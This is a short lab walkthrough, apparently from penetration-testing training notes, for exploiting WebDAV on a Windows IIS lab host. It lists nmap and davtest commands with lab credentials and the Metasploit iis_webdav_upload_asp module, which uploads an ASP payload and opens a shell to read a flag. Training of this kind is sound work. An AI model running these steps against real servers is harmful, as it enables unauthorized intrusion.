# Windows IIS Server: WebDav Metasploit

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2347–2379. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Exploit the WebDAV service and retrieve the flag!

**The following username and password may be used to access the service:**

| Username | Password | | bob | password_123321 |

Tools: Metasploit, DAVTest, Cadaver

```bash
nmap demo.ine.local
nmap --script http-enum -sV -p 80 demo.ine.local
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit

shell
cd /
dir
type flag.txt

```
